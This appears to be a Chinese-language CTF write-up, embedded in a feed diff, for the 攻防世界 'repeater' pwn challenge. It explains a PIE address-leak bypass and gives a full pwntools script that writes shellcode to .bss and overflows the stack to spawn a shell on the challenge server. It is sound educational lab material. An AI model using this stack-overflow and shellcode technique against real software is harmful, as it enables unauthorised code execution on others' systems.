-    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>IDA 中看到的地址是偏移地址</mark>，当开启了 <code>PIE</code> 地址随机化时，<strong>真实地址 = 程序的基地址 + 偏移地址</strong></p></li><li><p><mark>可以直接向 <code>.bss</code> 段上写入 <code>shellcode</code>，再通过栈溢出去执行段上的 <code>shellcode</code></mark></p></li><li><p><mark>开启 <code>PIE</code> 地址随机化后，程序执行过程中打印的地址就是真实的地址</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/ad96eacb-7944-4e2c-a5f1-0e9255c06639.zip">攻防世界-repeater</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/BaefzdI4ZDSKsp5.png" alt="攻防世界-repeater1.png"><br>64位 小端序，开启了 <code>PIE</code> 地址随机化</p></li><li><p>尝试运行：<br><img src="https://s2.loli.net/2023/03/18/dyNSQawDI7XZ24M.png" alt="攻防世界-repeater2.png"><br>存在溢出</p></li><li><p>在 IDA 下分析：<br><img src="https://s2.loli.net/2023/03/18/OtkR17GcAL4hyij.png" alt="攻防世界-repeater3.png"><br>首先通过 <code>memset()</code> 函数将 <code>byte_202040</code> 的地址初始化，然后通过 <code>sub_982()</code> 函数将用户输入写到 <code>byte_202040</code> 地址处</p></li><li><p>查看 <code>byte_202040</code> 地址的位置：<br><img src="https://s2.loli.net/2023/03/18/RaJQh8zT1CUK2mn.png" alt="攻防世界-repeater4.png"><br>发现 <code>byte_202040</code> 是存储到 <code>.bss</code> 段上的<br>由于这个题的函数列表中没有给出 <code>system()</code> 函数，因此在 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code> 再通过 <code>system()</code> 函数来调用执行的方法是不行了；不过可以考虑在 <code>.bss</code> 段上写入 <code>shellcode</code>，让程序跳转到这里来执行 <code>shellcode</code></p></li><li><p>但是这个题<mark>开启了 <code>PIE</code> 地址随机化，因此在 IDA 中看到的地址并不是程序中真实的地址，而是偏移地址</mark><br>所以即使将 <code>shellcode</code> 写入到 <code>0x202040</code> 的地址上，也并不知道 <code>shellcode</code> 在程序中存放的真实地址，需要先确定程序的基地址，就可以通过 <strong><em>真实地址 = 基地址 + 偏移地址</em></strong> 计算出来</p></li><li><p>观察到 for 循环中会打印出 <code>main()</code> 函数的地址【<strong>这个是函数在程序中的真实地址</strong>】<br><img src="https://s2.loli.net/2023/03/18/q5XoUvG4Rn1ibft.png" alt="攻防世界-repeater5.png"><br>但是打印 <code>main()</code> 函数的地址需要 <code>v5 == 3281697</code>，而程序中定义的是 <code>v5 = 1192227</code><br>注意到还有一个 <code>read()</code> 函数进行输入，将输入存储到 <code>s</code> 中，输入的长度为 <code>0x40</code><br>查看 <code>s</code> 所在的位置：<br><img src="https://s2.loli.net/2023/03/18/5LDMEoGv9suJgba.png" alt="攻防世界-repeater6.png"><br>由于 <code>read()</code> 输入的长度是 <code>0x40</code>，而 <code>s</code> 在栈中的长度是 <code>0x20</code>，因此是可以溢出的</p></li><li><p>接下来思路就很明确了：<br> ① 在输入 <code>name</code> 的时候，由于是存储到 <code>.bss</code> 段上的，在这里写入一个 <code>shellcode</code><br> ② 然后，通过 <code>read()</code> 函数进行栈溢出，一直覆盖到 <code>v5</code> 的位置，并将 <code>v5</code> 的值修改为 <code>3281697</code><br> ③ 然后程序就会打印出 <code>main()</code> 函数的真实地址，将这个地址记录下来<br> ④ 在 IDA 中找到 <code>main()</code> 函数的偏移地址，用 <code>main()</code> 函数的 <strong>真实地址 - 偏移地址 = 程序的基地址</strong><br> ⑤ 在 IDA 中找到 <code>shellcode</code> 存放的偏移地址，用 <code>shellcode</code> 的 <strong>偏移地址 + 程序的基地址 = 真实地址</strong><br> ⑥ 再次通过 <code>read()</code> 函数进行栈溢出，一直覆盖到函数返回的地方，将返回值修改为 <code>shellcode</code> 的真实地址<br> ⑦ 程序跳转到 <code>shellcod</code>e 的地址去执行 <code>shellcode</code>，获得 shell</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./repeater"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">64526</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me your name :\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># name存储在.bss段上，通过这里的输入向.bss段上写入shellcode</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>  <span class="token comment"># 栈溢出修改v5的值为3281697</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But there is gift for you :\n"</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 保存下程序打印出的main()的真实地址</span>    base_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x0A33</span>  <span class="token comment"># 利用main()的真实地址计算出程序的基地址，0x0A33是main()的偏移地址，可以在ida中查看</span>    shellcode_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x202040</span>  <span class="token comment"># 利用程序的基地址和写入的shellcode在.bss段上的偏移地址，计算出shellcode存放的真实地址</span>    <span class="token comment"># 0x202040是byte_202040在.bss段上的偏移地址，可以在ida中查看 </span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>  <span class="token comment"># 再次通过栈溢出让程序跳转到shellcode的位置去执行</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{7165ca68103868530e16b6038318afc5}</p></blockquote><p><img src="https://s2.loli.net/2023/03/19/ULo3sIZnerVEMtG.png" alt="攻防世界-repeater7.png"></p>]]></content>
-    
-    
-    <summary type="html">程序开启了PIE，但是会输出main的真实地址，而IDA中给出的是偏移地址，进而推算出其他函数的地址，往段上写shellcode直接执行也不错</summary>
-    
-    
-    
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-    
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
-    
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
